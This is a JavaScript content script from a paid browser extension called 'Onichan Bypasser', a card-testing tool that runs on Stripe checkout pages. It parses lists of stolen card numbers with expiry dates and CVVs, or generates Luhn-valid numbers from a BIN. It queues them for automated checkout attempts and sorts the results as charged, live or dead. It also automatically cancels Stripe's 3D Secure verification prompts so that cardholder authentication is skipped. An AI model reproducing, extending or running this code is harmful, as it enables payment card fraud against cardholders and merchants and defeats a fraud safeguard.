// === Onichan Bypasser V2.0 — Stripe Checkout Overlay ===
// Visual controller for the background automation engine.
// Reads cards from chrome.storage on Start; receives live events from background.

(function () {
  'use strict';
  if (window.__onichanOverlay) return;
  window.__onichanOverlay = true;

  let ui = {
    sessionStats: {total:0, charged:0, live:0, dead:0},
    running: false, startedAt: null, idx: 0, total: 0,
    currentCard: '-', settings: {}
  };
  let timerHandle = null;

  // ============ UI ============
  function buildOverlay() {
    const root = document.createElement('div');
    root.id = 'oni-overlay';
    root.innerHTML = `
      <div class="oni-header" id="oni-drag">
        <div class="oni-mascot-ring">
          <img class="oni-mascot" src="${chrome.runtime.getURL('images/mascot.png')}" alt="">
        </div>
        <div class="oni-title-block">
          <div class="oni-title">ONICHAN</div>
          <div class="oni-sub">AUTOMATION 💗</div>
        </div>
        <button class="oni-header-btn" id="oni-dock-btn" title="Minimize">—</button>
        <button class="oni-header-btn" id="oni-close-btn" title="Hide">✕</button>
      </div>
      <div class="oni-body">
        <div class="oni-status-box" id="oni-status-box">
          <div class="oni-status-line">
            <span class="oni-status-icon" id="oni-status-icon">💤</span>
            <span class="oni-status-text" id="oni-status-text">Stopped</span>
          </div>
        </div>
        <div class="oni-stats">
          <div class="oni-stat"><div class="oni-stat-val blue" id="oni-s-total">0</div><div class="oni-stat-label">Total</div></div>
          <div class="oni-stat"><div class="oni-stat-val green" id="oni-s-charged">0</div><div class="oni-stat-label">Charged</div></div>
          <div class="oni-stat"><div class="oni-stat-val purple" id="oni-s-live">0</div><div class="oni-stat-label">Live</div></div>
          <div class="oni-stat"><div class="oni-stat-val red" id="oni-s-dead">0</div><div class="oni-stat-label">Dead</div></div>
        </div>
        <div class="oni-info">
          <div class="oni-info-row"><span>Card</span><span id="oni-i-card">-</span></div>
          <div class="oni-info-row"><span>Processed</span><span id="oni-i-proc">0</span></div>
          <div class="oni-info-row"><span>Speed</span><span id="oni-i-speed">-</span></div>
          <div class="oni-info-row"><span>Time</span><span id="oni-i-time">00:00</span></div>
        </div>
        <div class="oni-controls">
          <button class="oni-btn oni-btn-start" id="oni-start-btn">▶ START</button>
          <button class="oni-btn oni-btn-stop" id="oni-stop-btn" title="Stop">⏹</button>
          <button class="oni-btn oni-btn-lock" id="oni-lock-btn" title="Lock">🔒</button>
        </div>
      </div>`;
    document.body.appendChild(root);
    attachUiEvents(root);
    return root;
  }

  function attachUiEvents(root) {
    // Use a small helper that listens to BOTH click and touchend so the
    // buttons fire reliably on mobile (Kiwi/Chrome Android) where the drag
    // handler can otherwise swallow the synthetic click.
    const tap = (el, fn) => {
      if (!el) return;
      el.addEventListener('click', (e) => { e.stopPropagation(); fn(e); });
      el.addEventListener('touchend', (e) => {
        e.stopPropagation();
        e.preventDefault();   // prevent the synthetic click that follows
        fn(e);
      }, {passive:false});
    };
    const toggleDock = () => {
      root.classList.toggle('docked');
      const btn = root.querySelector('#oni-dock-btn');
      if (btn) btn.textContent = root.classList.contains('docked') ? '⬜' : '—';
    };
    tap(root.querySelector('#oni-dock-btn'),  toggleDock);
    tap(root.querySelector('#oni-close-btn'), () => { root.style.display = 'none'; });
    // When docked (small bubble), tapping anywhere on the bubble re-expands.
    root.addEventListener('click', (e) => {
      if (root.classList.contains('docked') && !e.target.closest('button')) {
        toggleDock();
      }
    });
    tap(root.querySelector('#oni-lock-btn'),  () =>
      showToast('Lock', 'Click again to lock the panel position', 'pending'));
    tap(root.querySelector('#oni-start-btn'), startFromStorage);
    tap(root.querySelector('#oni-stop-btn'),  stopRun);
    enableDrag(root);
  }

  function enableDrag(root) {
    const handle = root.querySelector('#oni-drag');
    let dx=0, dy=0, sx=0, sy=0, dragging=false, moved=false;

    // Skip drag init when the touch starts on an interactive child element
    // (button / input). Without this, the preventDefault() below blocks the
    // synthetic click event from firing on header buttons (mobile bug).
    function isInteractive(target) {
      return target && target.closest && target.closest('button, input, select, a, .oni-header-btn');
    }
    function start(e) {
      if (isInteractive(e.target)) return;       // let buttons handle their own taps
      const p = e.touches ? e.touches[0] : e;
      dragging = true; moved = false;
      sx = p.clientX; sy = p.clientY;
      const r = root.getBoundingClientRect(); dx = r.left; dy = r.top;
      // Only call preventDefault on mouse events. On touch, deferring it
      // until the user actually moves keeps tap behaviour intact.
      if (!e.touches) e.preventDefault();
    }
    function move(e) {
      if (!dragging) return;
      const p = e.touches ? e.touches[0] : e;
      const ndx = p.clientX - sx, ndy = p.clientY - sy;
      if (!moved && Math.abs(ndx) + Math.abs(ndy) < 4) return;  // 4px threshold
      moved = true;
      root.style.left = (dx + ndx) + 'px';
      root.style.top  = (dy + ndy) + 'px';
      root.style.right = 'auto'; root.style.bottom = 'auto';
      if (e.cancelable) e.preventDefault();      // prevent page scroll while dragging
    }
    function end() { dragging = false; }
    handle.addEventListener('mousedown', start);
    handle.addEventListener('touchstart', start, {passive:true});
    document.addEventListener('mousemove', move);
    document.addEventListener('touchmove', move, {passive:false});
    document.addEventListener('mouseup', end);
    document.addEventListener('touchend', end);
  }

  function setStatus(icon, text, kind) {
    const iEl = document.getElementById('oni-status-icon');
    const tEl = document.getElementById('oni-status-text');
    const box = document.getElementById('oni-status-box');
    if (iEl) iEl.textContent = icon;
    if (tEl) tEl.textContent = text;
    if (box) {
      box.className = 'oni-status-box' +
        (kind === 'running' ? ' s-running' :
         kind === 'charged' ? ' s-charged' :
         kind === 'dead'    ? ' s-dead'    : '');
    }
  }

  function showToast(title, message, kind) {
    let wrap = document.getElementById('oni-toasts');
    if (!wrap) {
      wrap = document.createElement('div'); wrap.id = 'oni-toasts';
      wrap.className = 'oni-toast-wrap'; document.body.appendChild(wrap);
    }
    const t = document.createElement('div');
    t.className = 'oni-toast ' + (kind||'pending');
    const icon = kind==='charged'?'💗':kind==='live'?'💜':kind==='dead'?'❌':kind==='pending'?'⏳':'⚡';
    t.innerHTML = `
      <div class="oni-toast-icon">${icon}</div>
      <div class="oni-toast-body">
        <div class="oni-toast-title">${escapeHtml(title)}</div>
        <div class="oni-toast-msg">${escapeHtml(message)}</div>
      </div>
      <button class="oni-toast-close">×</button>`;
    t.querySelector('.oni-toast-close').onclick = () => t.remove();
    t.onclick = () => t.remove();
    wrap.appendChild(t);
    setTimeout(() => t.remove(), 5000);
  }

  function escapeHtml(s) {
    return String(s||'').replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
  }

  function maskCard(num) {
    const n = String(num||'').replace(/\D/g,'');
    if (n.length < 8) return n;
    return n.slice(0,4) + '****' + n.slice(-4);
  }

  function updateStatsUI() {
    const set = (id,v) => { const e = document.getElementById(id); if (e) e.textContent = v; };
    set('oni-s-total', ui.sessionStats.total);
    set('oni-s-charged', ui.sessionStats.charged);
    set('oni-s-live', ui.sessionStats.live);
    set('oni-s-dead', ui.sessionStats.dead);
    set('oni-i-card', ui.currentCard || '-');
    set('oni-i-proc', `${ui.idx}/${ui.total||'?'}`);
    if (ui.startedAt) {
      const elapsed = Math.floor((Date.now() - ui.startedAt) / 1000);
      const m = String(Math.floor(elapsed/60)).padStart(2,'0');
      const s = String(elapsed%60).padStart(2,'0');
      set('oni-i-time', `${m}:${s}`);
      const cpm = elapsed > 0 ? (ui.idx / (elapsed/60)).toFixed(1) : '0';
      set('oni-i-speed', cpm + ' cpm');
    } else {
      set('oni-i-time', '00:00'); set('oni-i-speed', '-');
    }
  }

  function setRunningUI(running) {
    ui.running = running;
    const startBtn = document.getElementById('oni-start-btn');
    if (!startBtn) return;
    if (running) {
      startBtn.textContent = '⏸ RUNNING';
      startBtn.style.opacity = '0.7';
      startBtn.disabled = true;
      if (!timerHandle) timerHandle = setInterval(updateStatsUI, 1000);
    } else {
      startBtn.textContent = '▶ START';
      startBtn.style.opacity = '1';
      startBtn.disabled = false;
      if (timerHandle) { clearInterval(timerHandle); timerHandle = null; }
    }
  }

  // ============ Card list parsing (mirror of popup) ============
  function luhnCheck(num) {
    num = String(num).replace(/\D/g,'');
    if (!num.length) return false;
    let sum = 0, alt = false;
    for (let i = num.length - 1; i >= 0; i--) {
      let n = parseInt(num[i]);
      if (alt) { n *= 2; if (n > 9) n -= 9; }
      sum += n; alt = !alt;
    }
    return sum % 10 === 0;
  }
  function parseCcList(text) {
    const lines = String(text||'').split(/\r?\n/);
    const out = [];
    for (let line of lines) {
      line = line.trim(); if (!line) continue;
      const parts = line.split(/[\|:; ,\t]+/).filter(Boolean);
      if (parts.length < 1) continue;
      let raw = parts[0].replace(/\D/g,'');

      // Handle concatenated format (no separators): num+mm+yy+cvv
      // Try AMEX (15) then standard (16)
      let num='', mm='', yy='', cvv='';
      if (parts.length === 1 && raw.length > 16) {
        for (const cardLen of [15, 16]) {
          if (raw.length < cardLen) continue;
          const candidate = raw.slice(0, cardLen);
          if (!luhnCheck(candidate)) continue;
          const rest = raw.slice(cardLen);
          // rest should be: MM YY CVV  → e.g. 021837231 or 12292222
          const tryMm = rest.slice(0,2);
          const tryYy = rest.slice(2,4);
          const tryCvv = rest.slice(4);
          if (parseInt(tryMm) >= 1 && parseInt(tryMm) <= 12) {
            num=candidate; mm=tryMm; yy=tryYy; cvv=tryCvv;
            break;
          }
        }
        if (!num) continue;
      } else {
        num = raw;
        if (num.length < 12 || !luhnCheck(num)) continue;
        mm = parts[1] ? parts[1].replace(/\D/g,'').padStart(2,'0').slice(-2) : '';
        yy = parts[2] ? parts[2].replace(/\D/g,'').slice(-2) : '';
        cvv = parts[3] ? parts[3].replace(/\D/g,'') : '';
      }

      if (!num || !luhnCheck(num)) continue;
      if (mm && yy) {
        const expDate = new Date(2000 + parseInt(yy), parseInt(mm), 0);
        if (expDate < new Date()) continue;
      }
      out.push({num, mm, yy, cvv});
    }
    return out;
  }
  function detectScheme(num) {
    num = String(num).replace(/\D/g,'');
    if (/^4/.test(num)) return 'VISA';
    if (/^(5[1-5]|2[2-7])/.test(num)) return 'MASTERCARD';
    if (/^3[47]/.test(num)) return 'AMEX';
    return 'OTHER';
  }
  function genCard(bin) {
    bin = String(bin).replace(/\D/g,'');
    const len = /^3[47]/.test(bin) ? 15 : 16;
    let body = bin;
    while (body.length < len - 1) body += Math.floor(Math.random() * 10);
    let sum = 0, alt = true;
    for (let i = body.length - 1; i >= 0; i--) {
      let n = parseInt(body[i]);
      if (alt) { n *= 2; if (n > 9) n -= 9; }
      sum += n; alt = !alt;
    }
    return body + ((10 - (sum % 10)) % 10);
  }
  function genExp(mmFix, yyFix) {
    const m = mmFix && mmFix !== 'RND' ? mmFix
              : String(1 + Math.floor(Math.random()*12)).padStart(2,'0');
    const yr = yyFix && yyFix !== 'RND' ? yyFix
              : String(26 + Math.floor(Math.random()*8));
    return [m, yr];
  }
  function genCvv(scheme, fix) {
    if (fix && fix !== 'RND' && fix.length >= 3) return fix;
    const len = scheme === 'AMEX' ? 4 : 3;
    let s = ''; for (let i = 0; i < len; i++) s += Math.floor(Math.random()*10);
    return s;
  }
  function generateBatchFromBin(cfg) {
    const bin = (cfg.binCcInput||'').replace(/\D/g,'');
    if (bin.length < 6) return [];
    const scheme = detectScheme(bin);
    const out = [];
    for (let i = 0; i < 50; i++) {
      const [m,y] = genExp(cfg.expMonth, cfg.expYear);
      out.push({num: genCard(bin), mm: m, yy: y, cvv: genCvv(scheme, cfg.cvvInput)});
    }
    return out;
  }

  // ============ Start / Stop ============
  async function startFromStorage() {
    const cfg = await new Promise(r => chrome.storage.local.get(null, d => r(d||{})));
    const cards = cfg.cardMode === 'ccList'
      ? parseCcList(cfg.ccListInput || '')
      : generateBatchFromBin(cfg);

    if (!cards.length) {
      const hint = cfg.cardMode === 'ccList'
        ? 'Paste valid cards in CC List tab of the popup'
        : 'Enter a BIN (e.g. 374355) in the popup Bypass tab';
      showToast('No cards loaded 💔', hint, 'pending');
      setStatus('⚠️', 'No cards — open popup & add cards');
      return;
    }

    ui.sessionStats = {total:0, charged:0, live:0, dead:0};
    ui.idx = 0; ui.total = cards.length; ui.startedAt = Date.now();
    ui.settings = cfg; ui.currentCard = '-';
    setStatus('⚡', `Queuing ${cards.length} cards…`);
    updateStatsUI();

    try {
      // NOTE: tabId is omitted — background infers from sender.tab.id (this content script)
      const res = await chrome.runtime.sendMessage({
        type: 'START_AUTOMATION', cards, settings: cfg
      });
      if (!res?.ok) {
        setStatus('❌', res?.error || 'Failed to start');
        showToast('Start failed', res?.error || 'unknown', 'dead');
      } else {
        setRunningUI(true);
        setStatus('🚀', `Running ${cards.length} cards`);
      }
    } catch (e) {
      setStatus('❌', e.message);
      showToast('Error', e.message, 'dead');
    }
  }

  async function stopRun() {
    try { await chrome.runtime.sendMessage({type:'STOP_AUTOMATION'}); } catch {}
    setStatus('⏹', 'Stopped');
    setRunningUI(false);
  }

  // ============ Listen for events from background ============
  chrome.runtime.onMessage.addListener((msg) => {
    if (msg.type !== 'OVERLAY_EVENT') return;
    const { event, data } = msg;
    switch (event) {
      case 'RUN_STARTED':
        ui.total = data.total; ui.startedAt = Date.now();
        ui.sessionStats = {total:0, charged:0, live:0, dead:0};
        setStatus('🚀', `Running on ${data.total} cards`);
        setRunningUI(true);
        showToast('Started 💗', `${data.total} cards queued`, 'pending');
        break;
      case 'CARD_START':
        ui.currentCard = data.card; ui.idx = data.idx;
        setStatus('⚡', `Filling ${data.card} (${data.idx}/${data.total})`);
        updateStatsUI();
        break;
      case 'WAITING_RESPONSE':
        if (data.status === 'retrying') {
          setStatus('🔄', 'Fields not found yet — retrying…');
        } else {
          setStatus('⏳', 'Waiting for response…');
        }
        break;
      case 'CARD_RESULT':
        if (data.stats) ui.sessionStats = data.stats;
        const kind = data.status;
        const titleMap = {charged:'💗 STRIPE CHARGED!', live:'💜 STRIPE LIVE!', dead:'❌ STRIPE DEAD'};
        showToast(titleMap[kind] || 'Result',
          `${data.card} — ${data.message||''}`, kind);
        updateStatsUI();
        break;
      case 'RUN_DONE':
        if (data.stats) ui.sessionStats = data.stats;
        setStatus('✅', `Done · ${data.stats.charged} charged, ${data.stats.live} live`);
        setRunningUI(false);
        showToast('Automation complete 💗',
          `${data.stats.charged}/${data.stats.total} charged`,
          data.stats.charged > 0 ? 'charged' : 'pending');
        break;
      case 'RUN_STOPPED':
        setStatus('⏹', data.reason ? `Stopped: ${data.reason}` : 'Stopped');
        setRunningUI(false);
        if (data.reason) showToast('Stopped', data.reason, 'pending');
        break;
    }
  });

  // ============ Boot ============
  function ensureOverlay() {
    if (!document.getElementById('oni-overlay')) buildOverlay();
    document.getElementById('oni-overlay').style.display = '';
  }

  function boot() {
    chrome.storage.local.get(null, cfg => {
      if (!cfg.licenseKey) return;
      const exp = cfg.licenseExpiry ? new Date(cfg.licenseExpiry) : null;
      if (!exp || exp < new Date()) return;
      ensureOverlay();

      // Show card count on startup
      const cards = cfg.cardMode === 'ccList'
        ? parseCcList(cfg.ccListInput || '')
        : generateBatchFromBin(cfg);
      if (cards.length > 0) {
        setStatus('💗', `${cards.length} cards ready · Press START`);
      } else {
        setStatus('💤', 'Stopped · No cards loaded');
      }

      // Resume if a run is already in progress
      chrome.runtime.sendMessage({type:'GET_RUN_STATE'}).then(r => {
        if (r?.run?.running) {
          ui.total = r.run.cards.length;
          ui.idx = r.run.idx;
          ui.sessionStats = r.run.sessionStats;
          ui.startedAt = r.run.startedAt;
          setStatus('🚀', `Running ${ui.idx}/${ui.total}`);
          setRunningUI(true);
          updateStatsUI();
        }
      }).catch(()=>{});
    });
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else { boot(); }

  // ============ 3DS Auto-Cancel ============
  // When Stripe pops a 3D Secure challenge, automatically click the Cancel/×
  // button so the run can move on to the next card without user interaction.
  (function watchFor3DS() {
    let lastCancelTs = 0;
    const THROTTLE_MS = 4000;

    function tryClickCancel(ctx) {
      const sels = [
        'button[aria-label="Close" i]',
        'button[aria-label="Cancel" i]',
        'button[data-testid*="cancel" i]',
        'button[data-testid*="close" i]',
        'button.Modal__closeButton',
        'button[title="Close" i]',
        'a[aria-label="Cancel" i]'
      ];
      for (const sel of sels) {
        const btn = ctx.querySelector(sel);
        if (btn && btn.offsetParent !== null) { btn.click(); return true; }
      }
      // Fallback: scan visible buttons for "Cancel" / "Close" text
      const all = ctx.querySelectorAll('button, a[role="button"]');
      for (const b of all) {
        const t = (b.textContent||'').trim().toLowerCase();
        if ((t === 'cancel' || t === 'close' || t === '×' || t === '✕') && b.offsetParent !== null) {
          b.click(); return true;
        }
      }
      return false;
    }

    function looksLike3DS(node) {
      if (!node || !node.querySelector) return false;
      // Stripe 3DS iframes / modals
      if (node.querySelector('iframe[name*="stripe-3ds" i], iframe[src*="3ds" i], iframe[title*="3D Secure" i]'))
        return true;
      const txt = (node.innerText || node.textContent || '').toLowerCase();
      return /3d secure|verify your card|authenticate your card|extra step/.test(txt);
    }

    const observer = new MutationObserver((muts) => {
      const now = Date.now();
      if (now - lastCancelTs < THROTTLE_MS) return;
      for (const m of muts) {
        for (const n of m.addedNodes) {
          if (n.nodeType !== 1) continue;
          if (looksLike3DS(n) || looksLike3DS(document.body)) {
            // Wait briefly for the modal to fully render before clicking
            setTimeout(() => {
              if (tryClickCancel(document)) {
                lastCancelTs = Date.now();
                showToast('3DS cancelled ⚡', 'Skipped to next card', 'pending');
              }
            }, 600);
            return;
          }
        }
      }
    });

    function startObserver() {
      if (!document.body) { setTimeout(startObserver, 200); return; }
      observer.observe(document.body, {childList:true, subtree:true});
    }
    startObserver();
  })();
})();
